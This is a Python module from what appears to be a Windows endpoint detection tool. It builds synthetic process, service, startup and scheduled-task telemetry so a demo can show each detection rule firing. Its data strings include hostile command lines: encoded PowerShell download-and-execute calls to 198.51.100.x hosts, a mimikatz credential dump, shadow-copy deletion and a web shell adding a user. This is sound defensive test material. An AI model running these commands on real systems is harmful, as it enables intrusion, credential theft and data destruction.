"""Synthetic attack scenarios used by --demo.

Nothing here executes. It builds fake telemetry (processes, services, startup items, tasks)
that is fed through the *real* detection engine so every rule can be demonstrated safely.
"""

import base64
import time

from agent.persistence_rules import startup_key, task_key
from agent.pathutils import parse_exe

_BASE = time.time() - 3600
_CMD = r"C:\Windows\System32\cmd.exe"
_PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
_ENC = base64.b64encode("Invoke-WebRequest http://198.51.100.7/s.ps1 | iex".encode("utf-16-le")).decode()


def _p(pid, ppid, name, path, user="LAB\\analyst", cmd=None, age=0, sig="Valid", signer="Microsoft Corporation", **extra):
    proc = {
        "timestamp": "", "pid": pid, "ppid": ppid, "name": name, "path": path, "username": user,
        "status": "running", "cmdline": cmd if cmd is not None else (path or name),
        "create_time": _BASE + age, "started": "", "sig_status": sig, "signer": signer,
        "sha256": f"{pid:064x}", "image_missing": False,
    }
    proc.update(extra)
    return proc


def _svc(name, display, path, start="Auto", account="LocalSystem", state="Running", sig="Valid", signer="Microsoft Corporation"):
    return {"timestamp": "", "name": name, "display_name": display, "state": state, "start_mode": start,
            "start_name": account, "path": path, "exe": parse_exe(path), "pid": None,
            "sig_status": sig, "signer": signer, "sha256": ""}


def build_demo():
    """Return (snapshot, baseline) for the demo scenario."""
    system = r"NT AUTHORITY\SYSTEM"
    processes = [
        # --- healthy baseline of a normal workstation --------------------------------
        _p(4, 0, "System", None, user=system, sig=None, signer=None, age=0),
        _p(400, 4, "smss.exe", r"C:\Windows\System32\smss.exe", user=system, age=1),
        _p(520, 400, "wininit.exe", r"C:\Windows\System32\wininit.exe", user=system, age=2),
        _p(560, 400, "winlogon.exe", r"C:\Windows\System32\winlogon.exe", user=system, age=2),
        _p(640, 520, "services.exe", r"C:\Windows\System32\services.exe", user=system, age=3),
        _p(660, 520, "lsass.exe", r"C:\Windows\System32\lsass.exe", user=system, age=3),
        _p(800, 640, "svchost.exe", r"C:\Windows\System32\svchost.exe", user=system, cmd=r"C:\Windows\System32\svchost.exe -k netsvcs", age=4),
        _p(1500, 560, "explorer.exe", r"C:\Windows\explorer.exe", age=30),
        _p(2100, 1500, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", signer="Google LLC", age=60),
        _p(2200, 1500, "Code.exe", r"C:\Users\analyst\AppData\Local\Programs\Microsoft VS Code\Code.exe", signer="Microsoft Corporation", age=70),
        # --- ATTACK 1: malicious macro -> cmd -> encoded PowerShell ----------------
        _p(3000, 1500, "WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", age=600),
        _p(3010, 3000, "cmd.exe", _CMD, cmd="cmd.exe /c powershell -nop -w hidden", age=610),
        _p(3020, 3010, "powershell.exe", _PS, cmd=f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {_ENC}", age=612),
        # --- ATTACK 2: masquerading svchost + look-alike ---------------------------
        _p(3100, 1500, "svchost.exe", r"C:\Users\Public\svchost.exe", user="LAB\\analyst", sig="NotSigned", signer=None, age=900),
        _p(3110, 1500, "scvhost.exe", r"C:\Users\analyst\AppData\Roaming\scvhost.exe", sig="NotSigned", signer=None, age=905),
        # --- ATTACK 3: credential dumping --------------------------------------------
        _p(3200, 1500, "mimikatz.exe", r"C:\Users\analyst\Downloads\mimikatz.exe", cmd="mimikatz.exe privilege::debug sekurlsa::logonpasswords", sig="NotSigned", signer=None, age=1200),
        # --- ATTACK 4: duplicate LSASS with the wrong parent -------------------------
        _p(3300, 1500, "lsass.exe", r"C:\Windows\System32\lsass.exe", sig="Valid", age=1300),
        # --- ATTACK 5: ransomware precursor ------------------------------------------
        _p(3400, 1500, "cmd.exe", _CMD, cmd="cmd.exe /c vssadmin delete shadows /all /quiet", age=1500),
        # --- ATTACK 6: double extension, deleted binary, tampered signature --------
        _p(3500, 1500, "invoice.pdf.exe", r"C:\Users\analyst\AppData\Local\Temp\invoice.pdf.exe", sig="NotSigned", signer=None, age=1700),
        _p(3600, 1500, "updater.exe", r"C:\ProgramData\Vendor\updater.exe", sig="HashMismatch", signer="Vendor Ltd", age=1800, image_missing=True),
        # --- ATTACK 7: SYSTEM process from a odd path --------------------------------
        _p(3700, 640, "helper.exe", r"C:\Tools\helper.exe", user=system, sig="NotSigned", signer=None, age=1900),
        # --- ATTACK 8: web shell -----------------------------------------------------
        _p(3800, 640, "w3wp.exe", r"C:\Windows\System32\inetsrv\w3wp.exe", user=r"IIS APPPOOL\DefaultAppPool", age=2000),
        _p(3810, 3800, "cmd.exe", _CMD, cmd="cmd.exe /c whoami & net user hacker P@ss123 /add", user=r"IIS APPPOOL\DefaultAppPool", age=2010),
    ]

    healthy = [
        _svc("Spooler", "Print Spooler", r"C:\Windows\System32\spoolsv.exe"),
        _svc("Dnscache", "DNS Client", r"C:\Windows\system32\svchost.exe -k NetworkService -p", account=r"NT AUTHORITY\NetworkService"),
        _svc("WinDefend", "Microsoft Defender Antivirus Service", r'"C:\Program Files\Windows Defender\MsMpEng.exe"', signer="Microsoft Corporation"),
        _svc("EventLog", "Windows Event Log", r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p", account=r"NT AUTHORITY\LocalService"),
    ]
    baseline_services = healthy + [
        _svc("LegacyAgent", "Legacy Agent", r"C:\Program Files\Legacy\agent.exe", start="Manual"),
        _svc("RemovedSvc", "Removed Service", r"C:\Program Files\Old\old.exe", start="Manual"),
    ]
    services = [dict(s) for s in healthy]
    services += [
        # new service from a public folder (persistence)
        _svc("WinUpdateHelper", "Windows Update Helper", r"C:\Users\Public\wuhelper.exe", sig="NotSigned", signer=None),
        # tampered existing service: Spooler-like binary path swap
        _svc("LegacyAgent", "Legacy Agent", r"C:\Users\Public\agent.exe", start="Auto", sig="NotSigned", signer=None),
        # unquoted path with spaces
        _svc("VendorSync", "Vendor Sync", r"C:\Program Files\Vendor Sync\bin\sync.exe -run", signer="Vendor Sync Inc."),
        # PsExec / Metasploit style service
        _svc("PSEXESVC", "PsExec", r"C:\Windows\PSEXESVC.exe", start="Manual", sig="Valid", signer="Sysinternals"),
        _svc("xK3f", "Random Service", r"%COMSPEC% /c powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')", state="Stopped", start="Manual"),
        # weak permissions
        _svc("BackupHelper", "Backup Helper", r"C:\BackupTool\backup.exe", signer="BackupTool Inc."),
    ]
    acl = {"BackupHelper": {"name": "BackupHelper", "file_writable_by": ["Authenticated Users"],
                            "dir_writable_by": ["Authenticated Users"], "key_writable_by": []},
           "VendorSync": {"name": "VendorSync", "file_writable_by": [], "dir_writable_by": [],
                          "key_writable_by": ["Users"]}}

    startup_base = [{"location": "HKCU\\Run", "name": "OneDrive", "command": r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
                     "exe": r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", "sig_status": "Valid", "signer": "Microsoft Corporation"}]
    startup = [dict(e, timestamp="") for e in startup_base] + [
        {"timestamp": "", "location": "HKCU\\Run", "name": "WindowsUpdateCheck",
         "command": r"C:\Users\analyst\AppData\Roaming\Microsoft\upd.exe", "exe": r"C:\Users\analyst\AppData\Roaming\Microsoft\upd.exe",
         "sig_status": "NotSigned", "signer": None},
        {"timestamp": "", "location": "HKLM\\Run", "name": "Dropper",
         "command": r"C:\Windows\Temp\x.exe", "exe": r"C:\Windows\Temp\x.exe", "sig_status": "NotSigned", "signer": None},
    ]
    tasks = [
        {"timestamp": "", "task_path": "\\", "name": "GoogleUpdateTask", "state": "Ready", "user": "SYSTEM",
         "command": r'"C:\Program Files\Google\Update\GoogleUpdate.exe" /c', "exe": r"C:\Program Files\Google\Update\GoogleUpdate.exe",
         "sig_status": "Valid", "signer": "Google LLC"},
        {"timestamp": "", "task_path": "\\", "name": "SystemHealthSync", "state": "Ready", "user": "SYSTEM",
         "command": r"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\sync.ps1",
         "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "sig_status": "Valid", "signer": "Microsoft Corporation"},
    ]
    baseline = {
        "created": "demo",
        "services": {s["name"]: {k: s.get(k) for k in ("path", "start_mode", "start_name", "display_name")} for s in baseline_services},
        "startup": {startup_key(e): e["command"] for e in startup_base},
        "tasks": {task_key(tasks[0]): tasks[0]["command"]},
    }
    snapshot = {"processes": processes, "services": services, "startup": startup, "tasks": tasks, "service_acl": acl}
    return snapshot, baseline
